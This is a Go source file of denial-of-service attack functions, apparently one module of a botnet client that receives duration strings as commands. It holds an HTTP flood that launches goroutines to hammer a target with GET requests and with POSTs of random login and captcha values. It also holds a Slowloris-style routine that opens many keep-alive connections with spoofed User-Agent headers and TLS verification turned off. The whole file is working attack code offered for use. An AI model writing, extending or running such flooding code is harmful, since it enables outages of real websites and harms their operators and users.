package main

import (
	"crypto/tls"
	"fmt"
	"math/rand"
	"net/http"
	"net/url"
	"strconv"
	"strings"
	"time"
)

func HttpsDefault(target string, port string, duration string) {

	duration = strings.ReplaceAll(duration, "\x00", "")
	duration = strings.ReplaceAll(duration, "\r", "")

	dur, _ := strconv.Atoi(string(duration))
	sec := time.Now().Unix()
	for time.Now().Unix() <= sec+int64(dur)-1 {
		go httpattack(target)
		go httpattack(target)
		go httpattack(target)
		go httpattack(target)
		go httpattack(target)
		go httpattack(target)
		go httpattack(target)

		time.Sleep(100 * time.Millisecond)

	}

	return

}

func httpattack(target string) {
	for i := 0; i < 30; i++ {
		fmt.Println(i)
		fmt.Println(target)
		http.Get(target)
		time.Sleep(30 * time.Millisecond)
		http.PostForm(target, url.Values{"user": {RandomInt(5)}, "password": {RandomInt(5)}, "captcha": {RandomInt(5)}})
	}
}

func Slowloris(target string, port string, duration string) {
	duration = strings.ReplaceAll(duration, "\x00", "")
	duration = strings.ReplaceAll(duration, "\r", "")
	dur, err := strconv.Atoi(duration)
	if err != nil {
		fmt.Println(err)
	}

	sec := time.Now().Unix()
	for time.Now().Unix() <= sec+int64(dur)-1 {
		go slowlorisattack(target)
		go slowlorisattack(target)
		go slowlorisattack(target)
		go slowlorisattack(target)
		time.Sleep(100 * time.Millisecond)

	}
}

func slowlorisattack(target string) {
	for i := 0; i < 30; i++ {

		fmt.Println(i)
		tr := &http.Transport{
			MaxIdleConns:       0,
			IdleConnTimeout:    30 * time.Second,
			DisableCompression: true,
			TLSClientConfig:    &tls.Config{InsecureSkipVerify: true},
		}
		client := &http.Client{Transport: tr}

		rand.Seed(time.Now().UTC().UnixNano())
		req, _ := http.NewRequest("GET", target, nil)
		req.Header.Add("User-Agent", GetUserAgent())
		req.Header.Add("Content-Length", "42")
		req.Header.Add("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8")
		req.Header.Add("Accept-Encoding", "gzip, deflate, br")
		req.Header.Add("Accept-Language", "en-US,en;q=0.5")
		req.Header.Add("Connection", "keep-alive")
		resp, err := client.Do(req)
		if err != nil {
			continue
		}
		defer resp.Body.Close()
		time.Sleep(time.Duration(5) * time.Second)

	}
}
